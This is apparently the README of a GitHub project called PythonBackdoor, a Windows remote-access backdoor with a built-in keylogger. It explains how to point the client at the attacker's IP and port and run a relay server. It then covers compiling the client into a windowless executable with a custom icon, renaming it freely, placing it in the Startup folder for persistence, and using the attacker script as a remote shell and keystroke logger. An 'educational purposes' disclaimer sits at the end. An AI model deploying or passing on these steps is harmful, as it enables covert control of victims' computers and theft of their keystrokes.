# PythonBackdoor

**Installation**
- Install with ``` git clone https://github.com/3BixxPy/PythonBackdoor.git ```
- If you dont have git just install to a folder
- Read all thats below

**Setup**
- Replace "IP" with your public IP in client.py and attacker.py **dont replace in server.py**
- Replace "CLIENTNUMBER" in client.py with any number that you havent used yet.
  - always set a different CLIENTNUMBER to every new client you intend to use
- Replace "PORT" in server.py, client.py and attacker.py with your port forwarded port, [Tutorial](https://www.youtube.com/watch?v=0F53xFGhT-c) on how to port forward
- Run server.py, it has to be always up or client wont be able to comunicate with the attacker
- Make an exe file out of client.py after you change the IP and the PORT use in CMD: \
  1.⠀``` cd your client.py location ```\
  2.⠀```pyinstaller --noconfirm --onefile --windowed --icon "your icon location here" client.py```\
  3.⠀Client.exe is now ready
- Run attacker.py and enter CLIENTNUMBER of a client you want to connect
  - if attacker doesnt connect that means that client if offline or an error has occurred, try restarting attacker.py

**Usage**
- Feel free to rename client.exe to anything
- Client.exe will run on startup if located in %appdata%\microsoft\windows\start menu\programs\startup
- Do not close the server and rerun
- In attacker.py use as a normal CMD
- If you want to use the keylogger make a kl.txt file and type "kl" in attacket.py keystrokes will be stored in kl.txt
- **kl wont close until client has restarted**!

# Info about Projekt PythonBackdoor
- Only for Windows!
- I will update this projekt as I get better at python
- After installing the updated project client probably wont work
- Also there are better backdoors than this that bypass WindowsDefender and wont show in task manager\
 **[For Educational Purposes Only]**
  - **You should not test this on devices that you do not own or do not have permission to test on**

**Known Bugs**
- When server restarts more than once client wont attempt to reconnect
- "kl close" command doesnt work
- 
  
